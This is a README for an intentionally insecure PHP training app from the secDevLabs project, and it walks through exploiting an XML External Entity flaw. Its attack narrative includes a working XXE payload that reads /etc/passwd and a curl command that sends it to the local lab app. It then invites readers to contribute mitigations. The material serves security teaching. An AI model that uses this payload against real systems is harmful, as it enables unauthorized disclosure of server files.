# ViniJR Blog

<p align="center">
    <img src="images/blog-fe.png"/>
</p>

This is a simple PHP web application that contains an example of an XML External Entity (XXE) vulnerability and the main goal of this app is to describe how a malicious user could exploit it.

## Index

- [Definition](#what-is-xxe)
- [Setup](#setup)
- [Attack narrative](#attack-narrative)
- [Objectives](#secure-this-app)
- [Solutions](#pr-solutions)
- [Contributing](#contributing)

## What is XXE?

Many older or poorly configured XML processors evaluate external entity references within XML documents. External entities can be used to disclose internal files using the file URI handler, internal file shares, internal port scanning, remote code execution, and denial of service attacks.

The main goal of this app is to discuss how **XXE** vulnerabilities can be exploited and to encourage developers to send secDevLabs Pull Requests on how they would mitigate these flaws.

## Setup

To start this intentionally **insecure application**, you will need [Docker][Docker Install] and [Docker Compose][Docker Compose Install]. After forking [secDevLabs](https://github.com/globocom/secDevLabs), you must type the following commands to start:

```sh
cd secDevLabs/owasp-top10-2017-apps/a4/vinijr-blog
```

```sh
make install
```

Then simply visit [localhost:10080][App] ! 😆

## Get to know the app ⚽️

To properly understand how this application works, you can follow these simple steps:

- Visit its homepage!
- Try sending ViniJR a message.

## Attack narrative

Now that you know the purpose of this app, what could go wrong? The following section describes how an attacker could identify and eventually find sensitive information about the app or its users. We encourage you to follow these steps and try to reproduce them on your own to better understand the attack vector! 😜

### 👀

#### Non sanitized input field allows for an attacker to retrieve sensitive information

After reviewing the inputs from the app, it is possible to identify that the section "GET IN TOUCH" allows users to send messages to the server, as shown in the following picture:

<img src="images/attack-1.png" align="center"/>

Using [Burp Suite](https://portswigger.net/burp) proxy to intercept this request (POST to contact.php) reveals that the message is being built using an XML (if you need any help setting up your proxy you should check this [guide](https://support.portswigger.net/customer/portal/articles/1783066-configuring-firefox-to-work-with-burp)):

<img src="images/attack-2.png" align="center"/>



To replicate this POST using [curl](https://curl.haxx.se/), create the following file `payload.xml`:

```XML
<?xml version="1.0" encoding="UTF-8"?>
<contact>
    <name>RAFAEL</name>
    <email>RAFAEL@EXAMPLE.com</email>
    <subject>YOU ROCK</subject>
    <message>I LOVE WATCHING YOUR SKILLS, MAN</message>
</contact>
```

And run:

```sh
curl -d @payload.xml localhost:10080/contact.php ; echo
```

By checking the source code of the [file](../vinijr-blog/app/contact.php), it is possible to see how this XML is loaded on the server side:

<img src="images/attack-3.png" align="center"/>

### 🔥

As no validation is being used to avoid [ENTITIES](https://www.w3schools.com/xml/xml_dtd_entities.asp) being sent to the PHP file, an attacker could create the following `evilxml.xml` to perform a XXE:

```XML
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<contact>
<name>&xxe;</name>
<email>RAFAEL@EXAMPLE.com</email>
<subject>YOU ROCK</subject>
<message>I LOVE WATCHING YOUR SKILLS, MAN</message>
</contact>
```

And, as the following picture shows, it is possible to realize that the attack succeeds and sensitive information is retrieved from the server that is hosting the vulnerable app:

```sh
curl -d @evilxml.xml localhost:10080/contact.php ; echo
```

<img src="images/attack-4.png" align="center"/>


## Secure this app

How would you mitigate this vulnerability? After your changes, an attacker should not be able to:

* Extract data from the server through the method showed above.

## PR solutions

[Spoiler alert 🚨 ] To understand how this vulnerability can be mitigated, check out [these pull requests](https://github.com/globocom/secDevLabs/pulls?q=is%3Apr+label%3A%22mitigation+solution+%F0%9F%94%92%22+label%3A%22ViniJr+Blog%22)!

## Contributing

We encourage you to contribute to SecDevLabs! Please check out the [Contributing to SecDevLabs](../../../docs/CONTRIBUTING.md) section for guidelines on how to proceed! 🎉

[Docker Install]:  https://docs.docker.com/install/
[Docker Compose Install]: https://docs.docker.com/compose/install/
[App]: http://localhost:10080